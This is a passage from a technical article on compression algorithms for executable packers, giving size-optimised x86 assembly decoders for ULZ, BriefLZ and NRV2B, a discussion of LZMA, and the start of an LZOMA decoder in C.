#000000;\">ulz_copy3</span>\n    <span style=\"color: #177500;\">; len = add_mod(len, &amp;in);</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">add_mod</span>\n<span style=\"color: #000000;\">ulz_copy3:</span>\n    <span style=\"color: #177500;\">; dist = ((token &amp; 16) &lt;&lt; 12) + *(uint16_t*)in;</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">16</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #1C01CE;\">12</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #177500;\">; eax = *(uint16_t*)in;</span>\n    <span style=\"color: #177500;\">; in += 2;</span>\n    <span style=\"color: #000000;\">lodsw</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">eax</span>\n    <span style=\"color: #177500;\">; p = out - dist</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #177500;\">; while(len--) *out++ = *p++;</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">ulz_main</span>\n    <span style=\"color: #177500;\">; }</span>\n<span style=\"color: #000000;\">ulz_exit:</span>\n    <span style=\"color: #177500;\">; return (uint32_t)(out - (uint8_t*)outbuf);</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n    \n<span style=\"color: #177500;\">; static uint32_t add_mod(uint32_t x, uint8_t** p);</span>\n<span style=\"color: #000000;\">add_mod:</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">eax</span>               <span style=\"color: #177500;\">; save eax</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; eax = len</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; i = 0</span>\n<span style=\"color: #000000;\">am_loop:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">byte</span>[<span style=\"color: #A90D91;\">esi</span>]     <span style=\"color: #177500;\">; c = *(*p)++</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; save c</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">cl</span>           <span style=\"color: #177500;\">; x += (c &lt;&lt; i)</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">edx</span>               <span style=\"color: #177500;\">; restore c</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">128</span>           <span style=\"color: #177500;\">; if(c &lt; 128) break;</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">am_exit</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">7</span>             <span style=\"color: #177500;\">; i+=7</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">cl</span>, <span style=\"color: #1C01CE;\">21</span>            <span style=\"color: #177500;\">; i&lt;=21</span>\n    <span style=\"color: #000000;\">jbe</span>    <span style=\"color: #000000;\">am_loop</span>\n<span style=\"color: #000000;\">am_exit:</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; ecx = len</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">eax</span>               <span style=\"color: #177500;\">; restore eax</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"blz\">12.3 BriefLZ</h2>\n<p>Designed by <a href=\"https://twitter.com/twibsen\">J\u00f8rgen Ibsen</a> and <a href=\"https://github.com/jibsen/brieflz\">published</a> in 2015. BriefLZ combines fast encoding and decoding with a good compression ratio. Ibsen uses 16-Bit tags instead of 8-Bit to improve performance on 16-bit architectures. It encodes the match reference length and offset using Elias gamma coding. The following size-optimized decoder in x86 assembly is only 92 bytes.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">blz_depack:</span>\n<span style=\"color: #000000;\">_blz_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]   <span style=\"color: #177500;\">; </span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; bs.dst = outbuf</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">ebx</span>, [<span style=\"color: #A90D91;\">edi</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">eax</span>]    <span style=\"color: #177500;\">; end = bs.dst + outlen</span>\n    <span style=\"color: #000000;\">lodsd</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; bs.src = inbuf</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_init_getbit</span>\n<span style=\"color: #000000;\">blz_getbit:</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ax</span>, <span style=\"color: #A90D91;\">ax</span>            <span style=\"color: #177500;\">; tag &lt;&lt;= 1 </span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_exit_getbit</span>   <span style=\"color: #177500;\">; continue for all bits</span>\n    <span style=\"color: #000000;\">lodsw</span>                    <span style=\"color: #177500;\">; read 16-bit tag</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ax</span>, <span style=\"color: #A90D91;\">ax</span>            <span style=\"color: #177500;\">; carry over previous bit</span>\n<span style=\"color: #000000;\">blz_exit_getbit:</span>\n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">blz_init_getbit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; ebp = blz_getbit</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ax</span>, <span style=\"color: #1C01CE;\">8000h</span>         <span style=\"color: #177500;\">; </span>\n<span style=\"color: #000000;\">blz_literal:</span>\n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; *out++ = *bs.src++</span>\n<span style=\"color: #000000;\">blz_main:</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">ebx</span>          <span style=\"color: #177500;\">; while(out &lt; end)</span>\n    <span style=\"color: #000000;\">jnb</span>    <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_exit</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; cf = blz_getbit</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_literal</span>       <span style=\"color: #177500;\">; if(cf==0) goto blz_literal</span>\n                             <span style=\"color: #177500;\">; </span>\n<span style=\"color: #000000;\">blz_getgamma:</span>\n    <span style=\"color: #000000;\">pushfd</span>                   <span style=\"color: #177500;\">; save cf</span>\n    <span style=\"color: #000000;\">cdq</span>                      <span style=\"color: #177500;\">; result = 1</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>\n<span style=\"color: #000000;\">blz_gamma_loop:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; cf = blz_getbit()</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; result = (result &lt;&lt; 1) + cf</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; cf = blz_getbit()</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_gamma_loop</span>    <span style=\"color: #177500;\">; while(cf == 1)</span>\n    \n    <span style=\"color: #000000;\">popfd</span>                    <span style=\"color: #177500;\">; restore cf</span>\n    <span style=\"color: #000000;\">cmovc</span>  <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">edx</span>          <span style=\"color: #177500;\">; ecx = cf ? edx : ecx</span>\n    <span style=\"color: #000000;\">cmc</span>                      <span style=\"color: #177500;\">; complement carry</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_getgamma</span>      <span style=\"color: #177500;\">; loop twice</span>\n    \n    <span style=\"color: #177500;\">; ofs = blz_getgamma(&amp;bs) - 2;</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n    \n    <span style=\"color: #177500;\">; len = blz_getgamma(&amp;bs) + 2;</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    \n    <span style=\"color: #177500;\">; ofs = (ofs &lt;&lt; 8) + (uint32_t)*bs.src++ + 1;</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">8</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dl</span>, [<span style=\"color: #A90D91;\">esi</span>]\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edx</span>\n    \n    <span style=\"color: #177500;\">; ptr = out - ofs;</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #A90D91;\">bl</span><span style=\"color: #000000;\">z_main</span>\n<span style=\"color: #000000;\">blz_exit:</span>\n    <span style=\"color: #177500;\">; return (out - (uint8_t*)outbuf);</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"nrv2b\">12.4 Not Really Vanished (NRV)</h2>\n<p>Designed by <a href=\"https://github.com/markus-oberhumer\">Markus F.X.J. Oberhumer</a> and used in the famous <a href=\"https://upx.github.io/\">Ultimate Packer for eXecutables (UPX)</a>. NRV uses an LZ77 format with Elias gamma coding for the reference match offset and length. The following x86 assembly derived from n2b_d_s1.asm in the <a href=\"http://www.oberhumer.com/opensource/ucl/\">UCL library</a> is currently 115 bytes. </p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">nrv2b_depack:</span>\n<span style=\"color: #000000;\">_nrv2b_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]   <span style=\"color: #177500;\">; output</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]   <span style=\"color: #177500;\">; input</span>\n    \n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">mul</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">dec</span>    <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0x80</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_get_bit</span>\n    <span style=\"color: #177500;\">; read next bit from input</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_get_bit</span>\n    \n    <span style=\"color: #000000;\">lodsb</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n<span style=\"color: #000000;\">exit_get_bit:</span>             \n    <span style=\"color: #000000;\">ret</span>\n<span style=\"color: #000000;\">init_get_bit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">nrv2b_main</span>\n    <span style=\"color: #177500;\">; copy literal</span>\n<span style=\"color: #000000;\">nrv2b_copy_byte:</span>\n    <span style=\"color: #000000;\">movsb</span>\n<span style=\"color: #000000;\">nrv2b_main:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">nrv2b_copy_byte</span>\n    \n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebx</span>\n<span style=\"color: #000000;\">nrv2b_match:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ebx</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">nrv2b_match</span>\n    \n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #1C01CE;\">3</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">nrv2b_offset</span>\n    \n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #1C01CE;\">8</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">bl</span>, [<span style=\"color: #A90D91;\">esi</span>]\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">jz</span>     <span style=\"color: #000000;\">nrv2b_exit</span>\n    \n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">ebx</span>\n<span style=\"color: #000000;\">nrv2b_offset:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">nrv2b_copy_bytes</span>\n    \n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">nrv2b_len:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">nrv2b_len</span>\n    \n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">ecx</span>\n<span style=\"color: #000000;\">nrv2b_copy_bytes:</span>\n    <span style=\"color: #000000;\">cmp</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">0xD00</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #000000;\">push</span>   <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #A90D91;\">edx</span>]\n    <span style=\"color: #000000;\">rep</span>    <span style=\"color: #000000;\">movsb</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">nrv2b_main</span>\n<span style=\"color: #000000;\">nrv2b_exit:</span>\n    <span style=\"color: #177500;\">; return depacked length</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"lzma\">12.5 Lempel-Ziv-Markov chain Algorithm  (LZMA)</h2>\n<p>Designed by Igor Pavlov and published in 1998 with the <a href=\"https://www.7-zip.org/\">7zip archiver</a>. It\u2019s an LZ77 variant with features similar to <a href=\"http://xavprods.free.fr/lzx/\">LZX</a> used for Microsoft CAB files and compressed help (CHM) files. LZMA uses an arithmetic coder to store compressed data as a stream of bits resulting in high compression ratios that inspired the development of Packfire, KKrunchy, and LZOMA, to name a few. There\u2019s a description by <a href=\"https://www.youtube.com/watch?v=VYK-xMm11S0\">Charles Bloom</a> in <a href=\"http://cbloomrants.blogspot.com/2010/08/08-20-10-deobfuscating-lzma.html\">De-obfuscating LZMA</a> and by Matt Mahoney in <a href=\"http://mattmahoney.net/dc/dce.html#Section_523\">Data Compression Explained</a>. <a href=\"https://twitter.com/aionescu/\">Alex Ionescu</a> has also published a <a href=\"https://github.com/ionescu007/minlzma/\">minimal implementation</a> with very detailed and helpful comments included in the source. Another <a href=\"https://github.com/upx/upx-lzma-sdk/blob/master/C/7zip/Compress/LZMA_C/LzmaDecodeSize.c\">size-optimized version</a> is available from the <a href=\"https://github.com/upx/upx-lzma-sdk\">UPX LZMA SDK</a>. The arithmetic coder for LZMA usually requires 16KB of RAM and may not be suitable for devices with limited resources. <a href=\"https://twitter.com/opcode_raeg\">mudlord&#8217;s</a> Win32 executable packer called <a href=\"https://github.com/mudlord/mupack/tree/master/backend/lzma\">mupack</a> has an x86 implementation.</p>\n<p>Although the compression ratio is excellent, and the speed is acceptable for small files. The complexity of the decompressor for only a few additional percents more in the compression ratio didn\u2019t merit an implementation in x86 assembly. I\u2019d be willing to implement it on a better architecture like ARM64, but not x86.  Shrinkler, KKrunchy, and LZOMA all offer ~55% ratios with much smaller RAM and ROM requirements that seem more suitable for executable compression.</p>\n<h2 id=\"lzoma\">12.6 Lempel\u2013Ziv\u2013Oberhumer-Markov Algorithm (LZOMA)</h2>\n<p>Designed by <a href=\"https://github.com/alef78\">Alexandr Efimov</a> and <a href=\"https://github.com/alef78/lzoma\">published in 2015</a>. LZOMA is specifically for decompression of the Linux Kernel but is also suitable for decompression of PE or ELF files too. It\u2019s primarily based on ideas used by LZMA and LZO. It provides fast decompression like LZO, and a simplified LZMA format provides a high compression ratio. The trade-off is slow compression requiring a lot of memory. It\u2019s possible to improve the compression ratio by using a real entropy encoder, but at the expense of decompression speed. While it\u2019s still only an experimental algorithm and probably needs more testing, the following is a decoder in C and handwritten x86 assembly.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #008800; font-weight: bold;\">typedef</span> <span style=\"color: #008800; font-weight: bold;\">struct</span> _lzoma_ctx {\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> w;\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>  <span style=\"color: #333333;\">*</span>src;\n} lzoma_ctx;\n\n<span style=\"color: #008800; font-weight: bold;\">static</span> <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> <span style=\"color: #0066BB; font-weight: bold;\">get_bit</span>(lzoma_ctx <span style=\"color: #333333;\">*</span>c) {\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> cy, x;\n    \n    x <span style=\"color: #333333;\">=</span> c<span style=\"color: #333333;\">-&gt;</span>w;\n    c<span style=\"color: #333333;\">-&gt;</span>w <span style=\"color: #333333;\">&lt;&lt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n\n    <span style=\"color: #888888;\">// no bits left?</span>\n    <span style=\"color: #008800; font-weight: bold;\">if</span>(c<span style=\"color: #333333;\">-&gt;</span>w <span style=\"color: #333333;\">==</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) {\n      <span style=\"color: #888888;\">// read 32-bit word</span>\n      x <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>(<span style=\"color: #333399; font-weight: bold;\">uint32_t</span><span style=\"color: #333333;\">*</span>)c<span style=\"color: #333333;\">-&gt;</span>src;\n      <span style=\"color: #888888;\">// advance input</span>\n      c<span style=\"color: #333333;\">-&gt;</span>src <span style=\"color: #333333;\">+=</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>;\n      <span style=\"color: #888888;\">// double with carry</span>\n      c<span style=\"color: #333333;\">-&gt;</span>w <span style=\"color: #333333;\">=</span> (x <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>) <span style=\"color: #333333;\">|</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n    }\n    <span style=\"color: #888888;\">// return carry bit</span>\n    <span style=\"color: #008800; font-weight: bold;\">return</span> (x <span style=\"color: #333333;\">&gt;&gt;</span> <span style=\"color: #0000DD; font-weight: bold;\">31</span>);\n}\n \n<span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #0066BB; font-weight: bold;\">lzoma_depack</span>(\n  <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>outbuf, \n  <span style=\"color: #333399; font-weight: bold;\">uint32_t</span> inlen, \n  <span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>inbuf) \n{\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>   <span style=\"color: #333333;\">*</span>out, <span style=\"color: #333333;\">*</span>ptr, <span style=\"color: #333333;\">*</span>end;\n    <span style=\"color: #333399; font-weight: bold;\">uint32_t</span>  cf, top, total, len, ofs, x, res;\n    lzoma_ctx c;\n\n    c.w    <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span> <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">31</span>;\n    c.src  <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)inbuf;\n    out    <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;\n    end    <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">+</span> inlen;\n    \n    <span style=\"color: #888888;\">// copy first byte</span>\n    <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>c.src<span style=\"color: #333333;\">++</span>;\n    len    <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n    ofs    <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n\n    <span style=\"color: #008800; font-weight: bold;\">while</span>(out <span style=\"color: #333333;\">&lt;</span> end) {\n      <span style=\"color: #008800; font-weight: bold;\">for</span>(;;) {\n        <span style=\"color: #888888;\">// if bit carried, break</span>\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(cf <span style=\"color: #333333;\">=</span> get_bit(<span style=\"color: #333333;\">&amp;</span>c)) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n        <span style=\"color: #888888;\">// copy byte</span>\n        <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>c.src<span style=\"color: #333333;\">++</span>;\n        len <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>;\n      }\n      <span style=\"color: #888888;\">// unpack lz</span>\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(len) {\n        cf <span style=\"color: #333333;\">=</span> get_bit(<span style=\"color: #333333;\">&amp;</span>c);\n      }\n      <span style=\"color: #888888;\">// carry?</span>\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(cf) {\n        len   <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>;\n        total <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">-</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;        \n        top   <span style=\"color: #333333;\">=</span> ((total <span style=\"color: #333333;\">&lt;=</span> <span style=\"color: #0000DD; font-weight: bold;\">400000</span>) <span style=\"color: #333333;\">?</span> <span style=\"color: #0000DD; font-weight: bold;\">60</span> <span style=\"color: #333333;\">:</span> <span style=\"color: #0000DD; font-weight: bold;\">50</span>); \n        ofs   <span style=\"color: 